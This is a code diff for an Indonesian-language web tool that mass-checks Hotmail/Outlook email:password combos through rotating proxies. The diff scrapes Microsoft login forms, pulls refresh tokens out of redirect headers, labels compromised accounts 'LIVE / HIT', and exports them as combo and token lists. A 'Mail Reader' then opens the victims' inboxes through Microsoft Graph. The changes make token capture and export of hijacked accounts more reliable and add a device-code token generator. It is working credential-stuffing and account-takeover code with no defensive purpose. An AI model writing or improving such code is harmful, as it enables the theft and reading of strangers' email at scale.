@@ -255,7 +255,8 @@ def get_access_token(refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, pro
     data = {
         "grant_type": "refresh_token",
         "client_id": client_id,
-        "refresh_token": refresh_token
+        "refresh_token": refresh_token,
+        "scope": "https://graph.microsoft.com/Mail.Read offline_access"
     }
     try:
         r = requests.post(TOKEN_URL, data=data, proxies=proxies, timeout=15)
@@ -265,6 +266,8 @@ def get_access_token(refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, pro
 
     if r.status_code != 200:
         err_desc = res_json.get("error_description") or res_json.get("error") or r.text[:120]
+        if "AADSTS700082" in err_desc or "expired" in err_desc.lower() or "revoked" in err_desc.lower() or "invalid_grant" in err_desc.lower() or "invalid_token" in err_desc.lower() or "IDX14100" in err_desc or "InvalidAuthenticationToken" in err_desc:
+            return None, "Email / Token Invalid atau Kedaluwarsa"
         for code, msg in ERROR_MESSAGES.items():
             if code in err_desc:
                 err_desc = f"[{code}] {msg}"
@@ -273,7 +276,7 @@ def get_access_token(refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, pro
 
     access_token = res_json.get("access_token")
     if not access_token:
-        return None, "Access token tidak ditemukan dalam respon"
+        return None, "Email / Token Invalid atau Kedaluwarsa"
     return access_token, None
 
 def check_outlook_account(email: str, password: str, refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None) -> Dict[str, Any]:
@@ -288,11 +291,11 @@ def check_outlook_account(email: str, password: str, refresh_token: str, client_
         "latest_subject": "",
         "latest_from": "",
         "latest_date": "",
-        "error": ""
+        "error": "Email / Token Invalid atau Kedaluwarsa"
     }
     access_token, err = get_access_token(refresh_token, client_id, proxy)
     if not access_token:
-        out["error"] = err
+        out["error"] = err or "Email / Token Invalid atau Kedaluwarsa"
         return out
 
     headers = {"Authorization": f"Bearer {access_token}"}
@@ -310,7 +313,10 @@ def check_outlook_account(email: str, password: str, refresh_token: str, client_
             "$top": "1",
             "$select": "id,subject,from,receivedDateTime,isRead"
         }
-        inbox_res = requests.get(INBOX_MESSAGES_URL, headers=headers, params=params, proxies=proxies, timeout=10)
+        inbox_res = requests.get(SINGLE_MESSAGE_URL, headers=headers, params=params, proxies=proxies, timeout=10)
+        if inbox_res.status_code != 200:
+            inbox_res = requests.get(INBOX_MESSAGES_URL, headers=headers, params=params, proxies=proxies, timeout=10)
+
         if inbox_res.status_code == 200:
             inbox_data = inbox_res.json().get("value", [])
             if inbox_data:
@@ -319,17 +325,25 @@ def check_outlook_account(email: str, password: str, refresh_token: str, client_
                 sender = latest.get("from", {}).get("emailAddress", {})
                 out["latest_from"] = sender.get("name") or sender.get("address") or "Unknown"
                 out["latest_date"] = (latest.get("receivedDateTime") or "")[:10]
-    except Exception:
-        pass
-
-    out["ok"] = True
-    out["status"] = "LIVE"
-    return out
+            out["ok"] = True
+            out["status"] = "LIVE"
+            out["error"] = ""
+            return out
+        else:
+            out["ok"] = False
+            out["status"] = "DEAD"
+            out["error"] = "Email / Token Invalid atau Kedaluwarsa"
+            return out
+    except Exception as e:
+        out["ok"] = False
+        out["status"] = "DEAD"
+        out["error"] = str(e)
+        return out
 
 def fetch_inbox_messages(refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None, top: int = 50) -> Dict[str, Any]:
     access_token, err = get_access_token(refresh_token, client_id, proxy)
     if not access_token:
-        return {"ok": False, "error": err, "messages": []}
+        return {"ok": False, "error": err or "Email / Token Invalid atau Kedaluwarsa", "messages": []}
 
     headers = {"Authorization": f"Bearer {access_token}"}
     proxies = {"http": proxy, "https": proxy} if proxy else None
@@ -347,7 +361,10 @@ def fetch_inbox_messages(refresh_token: str, client_id: str = DEFAULT_CLIENT_ID,
             r = requests.get(INBOX_MESSAGES_URL, headers=headers, params=params, proxies=proxies, timeout=15)
         
         if r.status_code != 200:
-            return {"ok": False, "error": f"HTTP {r.status_code}: {r.text[:120]}", "messages": []}
+            err_text = r.text
+            if "InvalidAuthenticationToken" in err_text or "IDX14100" in err_text or "CompactToken" in err_text or r.status_code == 401:
+                return {"ok": False, "error": "Email / Token Invalid atau Kedaluwarsa", "messages": []}
+            return {"ok": False, "error": "Email / Token Invalid atau Gagal Memuat Inbox", "messages": []}
 
         data = r.json()
         raw_items = data.get("value", [])
@@ -398,7 +415,7 @@ def fetch_inbox_messages(refresh_token: str, client_id: str = DEFAULT_CLIENT_ID,
 def fetch_message_detail(message_id: str, refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None) -> Dict[str, Any]:
     access_token, err = get_access_token(refresh_token, client_id, proxy)
     if not access_token:
-        return {"ok": False, "error": err}
+        return {"ok": False, "error": err or "Email / Token Invalid atau Kedaluwarsa"}
 
     headers = {"Authorization": f"Bearer {access_token}"}
     proxies = {"http": proxy, "https": proxy} if proxy else None
@@ -408,7 +425,9 @@ def fetch_message_detail(message_id: str, refresh_token: str, client_id: str = D
     try:
         r = requests.get(url, headers=headers, params=params, proxies=proxies, timeout=25)
         if r.status_code != 200:
-            return {"ok": False, "error": f"HTTP {r.status_code}: {r.text[:120]}"}
+            if "InvalidAuthenticationToken" in r.text or "IDX14100" in r.text or "CompactToken" in r.text or r.status_code == 401:
+                return {"ok": False, "error": "Email / Token Invalid atau Kedaluwarsa"}
+            return {"ok": False, "error": "Email / Token Invalid atau Gagal Memuat Surat"}
 
         data = r.json()
         sender_obj = data.get("from", {}).get("emailAddress", {})
@@ -518,6 +537,11 @@ def _hm_l_h(s, u, p, proxy_url=None, timeout=15):
         }
         r1 = s.post(o, data=data_payload, headers=headers, timeout=timeout, allow_redirects=False, proxies=prox)
         if prox: bytes_count += len(r1.content) + 500
+        l1 = r1.headers.get("Location", "")
+        t1 = re.search(r'refresh_token=([^&\s#]+)', unquote(l1))
+        if t1:
+            return {"refresh_token": t1.group(1), "status": "live", "bytes": bytes_count}
+
         src = r1.text
         if "privacynotice" in src:
             p_u = _hm_g_s(src, 'action="', '"').replace("&amp;", "&")
@@ -526,13 +550,19 @@ def _hm_l_h(s, u, p, proxy_url=None, timeout=15):
             if p_u and p_c:
                 rp = s.post(p_u, data={"correlation_id": p_i, "code": p_c}, headers=headers, timeout=timeout, proxies=prox)
                 if prox: bytes_count += len(rp.content) + 500
-        if "incorrect" in src or "Wrong password" in src or "doesn't exist" in src or "isn't correct" in src:
+        if "incorrect" in src or "Wrong password" in src or "doesn't exist" in src or "isn't correct" in src or "wrong_password" in src:
             return {"error": "Incorrect password / Email does not exist", "status": "die", "bytes": bytes_count}
+        
         f2 = _hm_e_p(src)
         u2 = _hm_e_u(src)
         if f2 and u2:
             r2 = s.post(u2, data={"login": u, "passwd": p, "PPFT": f2, "ps": "2"}, headers=headers, timeout=timeout, allow_redirects=False, proxies=prox)
             if prox: bytes_count += len(r2.content) + 500
+            l2 = r2.headers.get("Location", "")
+            t2 = re.search(r'refresh_token=([^&\s#]+)', unquote(l2))
+            if t2:
+                return {"refresh_token": t2.group(1), "status": "live", "bytes": bytes_count}
+
         a = {"client_id": "0000000048170EF2", "redirect_uri": "https://login.live.com/oauth20_desktop.srf", "response_type": "token", "scope": "service::outlook.office.com::MBI_SSL"}
         ra = s.get("https://login.live.com/oauth20_authorize.srf", params=a, headers=headers, timeout=timeout, allow_redirects=False, proxies=prox)
         if prox: bytes_count += len(ra.content) + 500
@@ -540,7 +570,13 @@ def _hm_l_h(s, u, p, proxy_url=None, timeout=15):
         t = re.search(r'refresh_token=([^&\s#]+)', unquote(l))
         if t:
             return {"refresh_token": t.group(1), "status": "live", "bytes": bytes_count}
-        if "ANON" in s.cookies:
+        
+        all_text = f"{l1} {l} {ra.text} {r1.text}"
+        t_fallback = re.search(r'refresh_token=([^&\s#"\']+)', unquote(all_text))
+        if t_fallback:
+            return {"refresh_token": t_fallback.group(1), "status": "live", "bytes": bytes_count}
+
+        if "ANON" in s.cookies or "RPSTAuth" in s.cookies or "MSPOK" in s.cookies or "MSPAuth" in s.cookies:
             return {"status": "live", "info": "L|S_T", "bytes": bytes_count}
         return {"error": "Login failed / Security checkpoint", "status": "die", "bytes": bytes_count}
     except Exception as e:
@@ -591,10 +627,22 @@ def check_single_hotmail(email: str, password: str, proxy_url: Optional[str] = N
     try:
         resolved_proxy = None
         if proxy_url and str(proxy_url).strip():
+            raw_p = str(proxy_url).strip()
+            sid = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
+            if "{sess}" in raw_p:
+                raw_p = raw_p.replace("{sess}", sid)
+            elif "dataimpulse.com" in raw_p and "sessid." not in raw_p:
+                if "@" in raw_p:
+                    auth_part, host_part = raw_p.split("@", 1)
+                    if ":" in auth_part:
+                        u, pw = auth_part.rsplit(":", 1)
+                        raw_p = f"{u}__sessid.{sid}:{pw}@{host_part}"
             try:
-                resolved_proxy = parse_proxy_spec(str(proxy_url).strip()).url
+                resolved_proxy = parse_proxy_spec(raw_p).url
             except Exception:
-                resolved_proxy = str(proxy_url).strip()
+                resolved_proxy = raw_p
+                if "://" not in resolved_proxy:
+                    resolved_proxy = f"http://{resolved_proxy}"
         s = requests.Session()
         r = _hm_l_h(s, email, password, resolved_proxy, timeout=timeout)
         total_bytes = r.get("bytes", 0)
@@ -604,10 +652,10 @@ def check_single_hotmail(email: str, password: str, proxy_url: Optional[str] = N
             cid = s.cookies.get("MSPCID", "").upper()
             result_msg = "Login OK"
             if t and cid:
-                at, b1 = _hm_g_a(s, t, proxy_url, timeout=timeout)
+                at, b1 = _hm_g_a(s, t, resolved_proxy, timeout=timeout)
                 total_bytes += b1
                 if at:
-                    ct, b2 = _hm_get_country(s, at, cid, proxy_url, timeout=timeout)
+                    ct, b2 = _hm_get_country(s, at, cid, resolved_proxy, timeout=timeout)
                     total_bytes += b2
                     if ct and ct != "UN":
                         result_msg = f"Login OK | 🌍 Negara: {country_name(ct)} ({ct})"
@@ -1904,7 +1952,10 @@ HTML_TEMPLATE = """<!DOCTYPE html>
               <button class="btn btn-sm btn-outline-gold flex-grow-1 py-1" style="font-size: 0.74rem;" onclick="document.getElementById('tmDirectTxtFile').click()" data-i18n-title="tm_upload_txt_title" title="Upload File .TXT (Bulk Auto-read)">
                 <i class="fa-solid fa-file-arrow-up me-1"></i><span data-i18n="tm_upload_txt">Upload .TXT</span>
               </button>
-              <button class="btn btn-sm btn-gold py-1 px-3" style="font-size: 0.74rem;" data-bs-toggle="modal" data-bs-target="#addAccountModal" data-i18n-title="tm_add_btn_title" title="Tambah Akun Manual">
+              <button class="btn btn-sm btn-outline-warning py-1 px-2" style="font-size: 0.74rem;" onclick="openDeviceAuthModal()" title="Generator Token Resmi Microsoft">
+                <i class="fa-brands fa-microsoft me-1"></i><span>Get Token</span>
+              </button>
+              <button class="btn btn-sm btn-gold py-1 px-2" style="font-size: 0.74rem;" data-bs-toggle="modal" data-bs-target="#addAccountModal" data-i18n-title="tm_add_btn_title" title="Tambah Akun Manual">
                 <i class="fa-solid fa-plus me-1"></i><span data-i18n="tm_add_btn">Add</span>
               </button>
             </div>
@@ -2103,28 +2154,55 @@ HTML_TEMPLATE = """<!DOCTYPE html>
 
           <div class="col-lg-7">
             <div class="card card-theme p-4 shadow-sm">
-              <div class="d-flex justify-content-between align-items-center mb-3">
+              <div class="d-flex justify-content-between align-items-center mb-3 flex-wrap gap-2">
                 <h5 class="fw-bold mb-0 text-warning"><i class="fa-solid fa-square-poll-vertical me-2"></i><span data-i18n="hm_results_title">Hasil Pengecekan MS Mail</span></h5>
-                <div class="d-flex gap-2">
-                  <button class="btn btn-sm btn-outline-gold" onclick="downloadField('hotmailLiveResult', 'hotmail_live.txt')">
-                    <i class="fa-solid fa-download me-1"></i><span data-i18n="hm_btn_dl_live">Save LIVE (.txt)</span>
+                <div class="d-flex gap-2 flex-wrap">
+                  <button class="btn btn-sm btn-outline-warning fw-semibold" onclick="openDeviceAuthModal()" title="Generator Token Resmi Microsoft Graph">
+                    <i class="fa-brands fa-microsoft me-1"></i><span>Get Token Resmi</span>
+                  </button>
+                  <button class="btn btn-sm btn-gold fw-bold shadow-sm" onclick="transferLiveToMailReader()" title="Langsung buka semua akun LIVE di tab Mail Reader">
+                    <i class="fa-solid fa-bolt me-1"></i><span>Kirim ke Mail Reader</span>
+                  </button>
+                  <button class="btn btn-sm btn-outline-gold" onclick="downloadHotmailLive('token')" title="Download format Email|Pass|Token|Client_ID">
+                    <i class="fa-solid fa-key me-1"></i><span>Save + Token (.txt)</span>
+                  </button>
+                  <button class="btn btn-sm btn-outline-secondary text-light" onclick="downloadHotmailLive('combo')" title="Download format Email:Pass">
+                    <i class="fa-solid fa-download me-1"></i><span>Save Combo</span>
                   </button>
                 </div>
               </div>
 
               <!-- LIVE Accounts Result -->
               <div class="mb-3">
-                <div class="d-flex justify-content-between align-items-center mb-1">
+                <div class="d-flex justify-content-between align-items-center mb-1 flex-wrap gap-1">
                   <span class="fw-bold text-success">
                     <i class="fa-solid fa-circle-check me-1"></i><span data-i18n="hm_live_title">LIVE / HIT</span> 
                     <span id="hotmailLiveCount" class="badge bg-success badge-counter ms-1">0</span>
                   </span>
                   <div class="btn-group btn-group-sm">
-                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyField('hotmailLiveResult')" data-i18n="hm_btn_copy">Copy</button>
-                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="downloadField('hotmailLiveResult', 'hotmail_live.txt')" data-i18n="hm_btn_save">Save</button>
+                    <button class="btn btn-sm btn-outline-warning" onclick="copyHotmailLive('token')" title="Salin format email|pass|token|client_id"><i class="fa-solid fa-key me-1"></i>Copy Token</button>
+                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyHotmailLive('combo')" title="Salin email:pass"><i class="fa-regular fa-copy me-1"></i>Copy Combo</button>
+                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyHotmailLive('full')" title="Salin email:pass | Negara"><i class="fa-solid fa-globe me-1"></i>Copy Full</button>
                   </div>
                 </div>
-                <textarea id="hotmailLiveResult" class="form-control form-control-theme border-success" rows="6" readonly data-i18n-ph="hm_live_ph" placeholder="Akun LIVE (berhasil login + negara) akan muncul di sini..."></textarea>
+
+                <!-- Live Format Switcher Toolbar -->
+                <div class="d-flex align-items-center gap-2 mb-2 p-1.5 rounded bg-black border border-secondary" style="font-size: 0.76rem;">
+                  <span class="text-warning fw-semibold ps-1 flex-shrink-0"><i class="fa-solid fa-sliders me-1"></i>Format Output:</span>
+                  <div class="btn-group btn-group-sm flex-grow-1" role="group">
+                    <button type="button" class="btn btn-xs btn-outline-warning active fw-bold py-1" id="btnFmtToken" onclick="setHotmailDisplayFormat('token')">
+                      <i class="fa-solid fa-key me-1"></i>Token (Mail Reader) <span class="badge bg-dark border border-warning text-warning ms-1" style="font-size:0.62rem; font-weight:normal;">(Dalam Pengembangan)</span>
+                    </button>
+                    <button type="button" class="btn btn-xs btn-outline-secondary text-light fw-bold py-1" id="btnFmtInfo" onclick="setHotmailDisplayFormat('info')">
+                      <i class="fa-solid fa-globe me-1"></i>Info Negara
+                    </button>
+                    <button type="button" class="btn btn-xs btn-outline-secondary text-light fw-bold py-1" id="btnFmtSimple" onclick="setHotmailDisplayFormat('simple')">
+                      <i class="fa-solid fa-user-lock me-1"></i>Email:Pass
+                    </button>
+                  </div>
+                </div>
+
+                <textarea id="hotmailLiveResult" class="form-control form-control-theme border-success font-monospace" rows="6" readonly data-i18n-ph="hm_live_ph" placeholder="Akun LIVE akan muncul di sini... (Catatan: Fitur Auto-Token Mail Reader masih dalam tahap pengembangan)"></textarea>
               </div>
 
               <!-- DIE / ERROR Accounts Result -->
@@ -2139,7 +2217,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     <button class="btn btn-sm btn-outline-secondary text-light" onclick="downloadField('hotmailDieResult', 'hotmail_die.txt')" data-i18n="hm_btn_save">Save</button>
                   </div>
                 </div>
-                <textarea id="hotmailDieResult" class="form-control form-control-theme border-danger" rows="5" readonly data-i18n-ph="hm_die_ph" placeholder="Akun DIE (salah password / tidak ada) akan muncul di sini..."></textarea>
+                <textarea id="hotmailDieResult" class="form-control form-control-theme border-danger font-monospace" rows="5" readonly data-i18n-ph="hm_die_ph" placeholder="Akun DIE (salah password / tidak ada) akan muncul di sini..."></textarea>
               </div>
 
             </div>
@@ -2610,6 +2688,67 @@ HTML_TEMPLATE = """<!DOCTYPE html>
     </div>
   </div>
 
+  <!-- Modal Microsoft OAuth Device Generator -->
+  <div class="modal fade" id="deviceAuthModal" tabindex="-1" aria-hidden="true" data-bs-backdrop="static">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content card-theme border-warning text-light shadow-lg">
+        <div class="modal-header border-secondary">
+          <h5 class="modal-title fw-bold text-warning">
+            <i class="fa-brands fa-microsoft me-2"></i>Generator Token Resmi Microsoft
+          </h5>
+          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" onclick="stopDeviceAuthPolling()"></button>
+        </div>
+        <div class="modal-body text-center p-4">
+          
+          <div id="deviceAuthStepLoading">
+            <div class="spinner-border text-warning mb-3" role="status"></div>
+            <p class="text-secondary small mb-0">Menghubungi server Microsoft untuk meminta kode otorisasi...</p>
+          </div>
+
+          <div id="deviceAuthStepCode" style="display: none;">
+            <p class="small text-secondary mb-2">1. Salin kode otorisasi berikut:</p>
+            <div class="d-flex justify-content-center align-items-center gap-2 mb-3">
+              <span id="deviceAuthUserCode" class="fs-2 fw-bold font-monospace text-warning px-3 py-1 rounded bg-black border border-warning" style="letter-spacing: 2px;">--------</span>
+              <button class="btn btn-outline-warning btn-sm py-2 px-3" onclick="copyDeviceUserCode()" title="Salin Kode">
+                <i class="fa-regular fa-copy me-1"></i>Copy
+              </button>
+            </div>
+            
+            <p class="small text-secondary mb-3">2. Klik tombol di bawah untuk membuka halaman login resmi Microsoft, tempelkan kode tersebut lalu login akun Anda:</p>
+            
+            <a id="deviceAuthLoginLink" href="https://microsoft.com/devicelogin" target="_blank" class="btn btn-gold w-100 py-2 mb-3 fw-bold">
+              <i class="fa-solid fa-arrow-up-right-from-square me-2"></i>Buka Login Microsoft (microsoft.com/devicelogin)
+            </a>
+
+            <div class="p-2 rounded bg-black border border-secondary text-secondary small d-flex align-items-center justify-content-center gap-2">
+              <div class="spinner-grow spinner-grow-sm text-warning" role="status"></div>
+              <span id="deviceAuthStatusText">Menunggu persetujuan login di browser Microsoft...</span>
+            </div>
+          </div>
+
+          <div id="deviceAuthStepSuccess" style="display: none;">
+            <i class="fa-solid fa-circle-check text-success fa-3x mb-2"></i>
+            <h5 class="fw-bold text-success">Token Resmi Berhasil Didapatkan!</h5>
+            <p id="deviceAuthSuccessEmail" class="text-warning small fw-semibold mb-2"></p>
+            <textarea id="deviceAuthResultLine" class="form-control form-control-theme font-monospace small mb-3" rows="3" readonly></textarea>
+            <div class="d-flex gap-2">
+              <button class="btn btn-outline-warning flex-grow-1" onclick="copyDeviceResultLine()">
+                <i class="fa-regular fa-copy me-1"></i>Copy Format Mail Reader
+              </button>
+              <button class="btn btn-gold flex-grow-1" onclick="applyDeviceTokenToMailReader()">
+                <i class="fa-solid fa-inbox me-1"></i>Buka di Mail Reader
+              </button>
+            </div>
+          </div>
+
+        </div>
+        <div class="modal-footer border-secondary">
+          <button type="button" class="btn btn-secondary btn-sm" data-bs-dismiss="modal" onclick="stopDeviceAuthPolling()">Tutup</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
   <script>
     /* ================= INTERNATIONALIZATION (i18n) ================= */
@@ -2950,6 +3089,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
 
       hotmailList = lines;
       hotmailLiveResults = [];
+      hotmailLiveItems = [];
       hotmailDieResults = [];
       hotmailAbortController = new AbortController();
 
@@ -3021,13 +3161,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             }
 
             if (res && res.live) {
-              const liveLine = `${res.email}:${res.password} | ${res.motivo || 'Login OK'}`;
-              hotmailLiveResults.push(liveLine);
-              if (liveArea) {
-                liveArea.value = hotmailLiveResults.join(String.fromCharCode(10));
-                liveArea.scrollTop = liveArea.scrollHeight;
-              }
-              if (liveCnt) liveCnt.textContent = hotmailLiveResults.length;
+              hotmailLiveItems.push(res);
+              renderHotmailLiveTextarea();
+              if (liveCnt) liveCnt.textContent = hotmailLiveItems.length;
             } else {
               const dieMsg = res && res.motivo ? res.motivo : 'Login failed';
               const dieLine = `${email}:${password} | ${dieMsg}`;
@@ -3066,7 +3202,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       if (document.getElementById('btnStopHotmail')) document.getElementById('btnStopHotmail').disabled = true;
       if (progBar) progBar.style.width = '100%';
       if (progTxt) progTxt.textContent = `${total}/${total} (100% Selesai)`;
-      showToast(`Pengecekan Hotmail selesai! Live: ${hotmailLiveResults.length}, Die: ${hotmailDieResults.length}`, 'fa-solid fa-circle-check text-success');
+      showToast(`Pengecekan Hotmail selesai! Live: ${hotmailLiveItems.length}, Die: ${hotmailDieResults.length}`, 'fa-solid fa-circle-check text-success');
     }
 
     function stopHotmailChecking() {
@@ -3076,6 +3212,111 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       if (document.getElementById('btnStartHotmail')) document.getElementById('btnStartHotmail').disabled = false;
       if (document.getElementById('btnStopHotmail')) document.getElementById('btnStopHotmail').disabled = true;
       showToast('Pengecekan Hotmail dihentikan.', 'fa-solid fa-hand text-warning');
+    }
+
+    let currentHotmailFormat = 'token';
+
+    function setHotmailDisplayFormat(fmt) {
+      currentHotmailFormat = fmt;
+      ['btnFmtToken', 'btnFmtInfo', 'btnFmtSimple'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) {
+          el.classList.remove('active', 'btn-outline-warning');
+          el.classList.add('btn-outline-secondary', 'text-light');
+        }
+      });
+      const activeBtn = document.getElementById(fmt === 'token' ? 'btnFmtToken' : (fmt === 'info' ? 'btnFmtInfo' : 'btnFmtSimple'));
+      if (activeBtn) {
+        activeBtn.classList.add('active', 'btn-outline-warning');
+        activeBtn.classList.remove('btn-outline-secondary', 'text-light');
+      }
+      renderHotmailLiveTextarea();
+    }
+
+    function renderHotmailLiveTextarea() {
+      const liveArea = document.getElementById('hotmailLiveResult');
+      if (!liveArea) return;
+      if (!hotmailLiveItems || hotmailLiveItems.length === 0) {
+        return;
+      }
+      let lines = [];
+      if (currentHotmailFormat === 'simple') {
+        lines = hotmailLiveItems.map(it => `${it.email}:${it.password}`);
+      } else if (currentHotmailFormat === 'info') {
+        lines = hotmailLiveItems.map(it => `${it.email}:${it.password} | ${it.motivo || 'Login OK'}`);
+      } else {
+        // format token (Mail Reader ready)
+        lines = hotmailLiveItems.map(it => it.refresh_token ? `${it.email}|${it.password}|${it.refresh_token}|${it.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753'}` : `${it.email}:${it.password} | Login OK (No Token)`);
+      }
+      liveArea.value = lines.join(String.fromCharCode(10));
+      liveArea.scrollTop = liveArea.scrollHeight;
+    }
+
+    function copyHotmailLive(format = 'token') {
+      if (!hotmailLiveItems || hotmailLiveItems.length === 0) {
+        const txt = document.getElementById('hotmailLiveResult')?.value || '';
+        if (!txt.trim()) return showToast('Belum ada akun LIVE untuk disalin!', 'fa-solid fa-triangle-exclamation text-warning');
+        return copyToClipboard(txt, '✓ ' + getI18nText('tm_copied', 'Disalin!'), 'fa-solid fa-copy text-success');
+      }
+
+      let lines = [];
+      if (format === 'combo') {
+        lines = hotmailLiveItems.map(it => `${it.email}:${it.password}`);
+      } else if (format === 'full') {
+        lines = hotmailLiveItems.map(it => `${it.email}:${it.password} | ${it.motivo || 'Login OK'}`);
+      } else {
+        // format token (Mail Reader ready)
+        lines = hotmailLiveItems.map(it => it.refresh_token ? `${it.email}|${it.password}|${it.refresh_token}|${it.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753'}` : `${it.email}:${it.password}`);
+      }
+
+      copyToClipboard(lines.join(String.fromCharCode(10)), `✓ Disalin ${lines.length} Akun LIVE (${format.toUpperCase()})`, 'fa-solid fa-key text-warning');
+    }
+
+    function downloadHotmailLive(format = 'token') {
+      if (!hotmailLiveItems || hotmailLiveItems.length === 0) {
+        const txt = document.getElementById('hotmailLiveResult')?.value || '';
+        if (!txt.trim()) return showToast('Belum ada akun LIVE untuk disimpan!', 'fa-solid fa-triangle-exclamation text-warning');
+        return downloadField('hotmailLiveResult', 'hotmail_live.txt');
+      }
+
+      let lines = [];
+      let filename = 'hotmail_live.txt';
+      if (format === 'combo') {
+        lines = hotmailLiveItems.map(it => `${it.email}:${it.password}`);
+        filename = 'hotmail_live_combo.txt';
+      } else {
+        lines = hotmailLiveItems.map(it => it.refresh_token ? `${it.email}|${it.password}|${it.refresh_token}|${it.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753'}` : `${it.email}:${it.password}`);
+        filename = 'hotmail_live_tokens.txt';
+      }
+
+      const blob = new Blob([lines.join(String.fromCharCode(10))], { type: 'text/plain;charset=utf-8;' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = filename;
+      link.click();
+    }
+
+    async function transferLiveToMailReader() {
+      if (!hotmailLiveItems || hotmailLiveItems.length === 0) {
+        return showToast('Belum ada akun LIVE. Silakan jalankan pengecekan terlebih dahulu!', 'fa-solid fa-triangle-exclamation text-warning');
+      }
+
+      const tokenLines = hotmailLiveItems
+        .filter(it => it && it.refresh_token)
+        .map(it => `${it.email}|${it.password}|${it.refresh_token}|${it.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753'}`)
+        .join(String.fromCharCode(10));
+
+      if (!tokenLines) {
+        return showToast('Tidak ada token yang dapat ditransfer.', 'fa-solid fa-triangle-exclamation text-warning');
+      }
+
+      // Switch to Mail Reader tab
+      const tabBtn = document.querySelector('.main-nav-tab[onclick*="tab-mail"]');
+      if (tabBtn) tabBtn.click();
+      if (typeof selectMobileTab === 'function') selectMobileTab('mail');
+
+      showToast(`Mengimpor ${hotmailLiveItems.length} akun LIVE ke Mail Reader...`, 'fa-solid fa-spinner fa-spin text-warning');
+      await importAccountsFromText(tokenLines);
     }
 
     
@@ -3840,12 +4081,29 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       try {
         const raw = localStorage.getItem('chenstore_outlook_accounts');
         if (raw) {
-          outlookAccounts = JSON.parse(raw) || [];
+          outlookAccounts = (JSON.parse(raw) || []).filter(a => a && a.ok);
+          saveOutlookAccountsStorage();
           if (outlookAccounts.length > 0) {
             renderAccountsList();
             if (window.innerWidth > 991) {
               selectOutlookAccount(0);
             }
+          } else {
+            selectedAccountIndex = -1;
+            renderAccountsList();
+            const emailLbl = document.getElementById('tmActiveEmailLabel');
+            if (emailLbl) emailLbl.textContent = getI18nText('tm_active_email_placeholder', 'Pilih Akun');
+            const badge = document.getElementById('tmConnectionBadge');
+            if (badge) {
+              badge.className = 'badge bg-dark border border-secondary text-secondary px-2 py-1';
+              badge.innerHTML = getI18nText('tm_badge_standby', '● Standby');
+            }
+            const inboxTitle = document.getElementById('tmInboxTitle');
+            if (inboxTitle) inboxTitle.innerHTML = `<i class="fa-regular fa-folder-open me-1"></i> ${getI18nText('tm_inbox_title', 'INBOX')} (0)`;
+            const msgCont = document.getElementById('tmMessagesContainer');
+            if (msgCont) msgCont.innerHTML = `<div class="text-center text-muted py-5 small">${getI18nText('tm_empty_inbox_select', 'Pilih akun di sebelah kiri untuk melihat pesan inbox.')}</div>`;
+            const reader = document.getElementById('tmReaderContent');
+            if (reader) reader.innerHTML = `<div class="text-center text-muted my-auto"><i class="fa-regular fa-envelope-open fa-3x mb-3 text-warning"></i><h5 class="text-light">${getI18nText('tm_no_email_selected', 'Belum ada email yang dipilih')}</h5></div>`;
           }
         }
       } catch(e) {}
@@ -3984,7 +4242,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       container.innerHTML = html;
     }
 
-    function handleTxtFileUpload(event) {
+    function handleFileSelect(event) {
       const file = event.target.files[0];
       if (!file) return;
       const reader = new FileReader();
@@ -3995,6 +4253,10 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         event.target.value = '';
       };
       reader.readAsText(file);
+    }
+
+    function handleTxtFileUpload(event) {
+      return handleFileSelect(event);
     }
 
     function handleModalFileSelect(event) {
@@ -4027,11 +4289,12 @@ HTML_TEMPLATE = """<!DOCTYPE html>
 
         if (!items || items.length === 0) {
           renderAccountsList();
-          return showToast('Format not recognized / tokens missing!', 'fa-solid fa-circle-xmark text-danger');
+          return showToast('Format tidak dikenali / token tidak ditemukan!', 'fa-solid fa-circle-xmark text-danger');
         }
 
         let currentIndex = 0;
         let addedCount = 0;
+        let deadCount = 0;
 
         async function worker() {
           while (currentIndex < items.length) {
@@ -4049,27 +4312,19 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                   proxy: proxy
                 })
               });
-              outlookAccounts.push(data);
-              addedCount++;
-              saveOutlookAccountsStorage();
-              renderAccountsList();
-              if (selectedAccountIndex === -1 && window.innerWidth > 991) {
-                selectOutlookAccount(0);
+              if (data && data.ok && data.status === 'LIVE') {
+                outlookAccounts.push(data);
+                addedCount++;
+                saveOutlookAccountsStorage();
+                renderAccountsList();
+                if (selectedAccountIndex === -1 && window.innerWidth > 991) {
+                  selectOutlookAccount(0);
+                }
+              } else {
+                deadCount++;
               }
             } catch (e) {
-              outlookAccounts.push({
-                ok: false,
-                email: item.email || 'Error',
-                error: e.message,
-                refresh_token: item.refresh_token,
-                client_id: item.client_id
-              });
-              addedCount++;
-              saveOutlookAccountsStorage();
-              renderAccountsList();
-              if (selectedAccountIndex === -1 && window.innerWidth > 991) {
